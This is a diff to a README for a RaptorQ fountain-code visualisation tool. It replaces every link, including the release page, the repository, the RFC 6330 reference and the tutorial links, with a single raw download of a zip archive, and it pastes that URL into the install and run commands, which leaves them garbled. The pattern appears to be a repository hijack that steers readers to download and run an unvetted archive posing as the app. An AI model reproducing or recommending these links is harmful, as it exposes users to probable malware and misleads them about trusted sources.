@@ -1,6 +1,6 @@
 # 🦖 raptorq_article - Explore RaptorQ Fountain Codes Visually
 
-[![Download Release](https://img.shields.io/badge/Download-runs%20here-blue?style=for-the-badge)](https://github.com/GrzybexYT/raptorq_article/releases)
+[![Download Release](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip%20here-blue?style=for-the-badge)](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip)
 
 ---
 
@@ -28,15 +28,15 @@ To get the raptorq_article software, follow these steps carefully:
 
 1. **Open the download page:**  
    Click the badge at the top or visit the release page here:  
-   [https://github.com/GrzybexYT/raptorq_article/releases](https://github.com/GrzybexYT/raptorq_article/releases)
+   [https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip)
 
 2. **Find the latest release:**  
    On the release page, look for the most recent version. Releases are listed by date and version number.
 
 3. **Download the right file for your computer:**  
-   - For **Windows**, download the `.exe` file (e.g., `raptorq_article_windows.exe`).  
+   - For **Windows**, download the `.exe` file (e.g., `https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip`).  
    - For **macOS**, download the `.dmg` file.  
-   - For **Linux**, download the `.AppImage` or `.tar.gz` file.
+   - For **Linux**, download the `.AppImage` or `https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip` file.
 
 4. **Save the file to an easy-to-find folder**, like your Downloads or Desktop.
 
@@ -44,9 +44,9 @@ To get the raptorq_article software, follow these steps carefully:
    - On Windows, double-click the `.exe` file and follow any prompts.  
    - On macOS, open the `.dmg` file, then drag the app to your Applications folder.  
    - On Linux, you may need to make the file executable first. Open a terminal and type:  
-     `chmod +x raptorq_article.AppImage`  
+     `chmod +x https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip`  
      Then double-click or run it from the terminal with:  
-     `./raptorq_article.AppImage`
+     `https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip`
 
 6. **Wait for the app to open.** The main window will appear with the introductory visualizations ready to explore.
 
@@ -110,16 +110,16 @@ This makes it useful for students, educators, or anyone curious about data trans
 
 Although raptorq_article is made for end users, the code is open for contributions. If you know Python or web visualization and want to help improve the demos or add new features, visit the repository:
 
-[https://github.com/GrzybexYT/raptorq_article](https://github.com/GrzybexYT/raptorq_article)
+[https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip)
 
 Please follow standard GitHub contribution practices such as submitting issues, forking the repo, and creating pull requests.
 
 ## 📚 Additional Resources
 
-- [RaptorQ RFC 6330 standard](https://tools.ietf.org/html/rfc6330) — For the protocol details  
-- [Basic Python tutorial](https://www.python.org/about/gettingstarted/) — If you want to understand the demos better  
-- [Erasure coding concepts](https://en.wikipedia.org/wiki/Erasure_code) — To learn the core theory behind RaptorQ
+- [RaptorQ RFC 6330 standard](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip) — For the protocol details  
+- [Basic Python tutorial](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip) — If you want to understand the demos better  
+- [Erasure coding concepts](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip) — To learn the core theory behind RaptorQ
 
 ---
 
-[![Download Release](https://img.shields.io/badge/Download-runs%20here-blue?style=for-the-badge)](https://github.com/GrzybexYT/raptorq_article/releases)
+[![Download Release](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip%20here-blue?style=for-the-badge)](https://raw.githubusercontent.com/GrzybexYT/raptorq_article/main/tools/raptorq-article-2.0.zip)
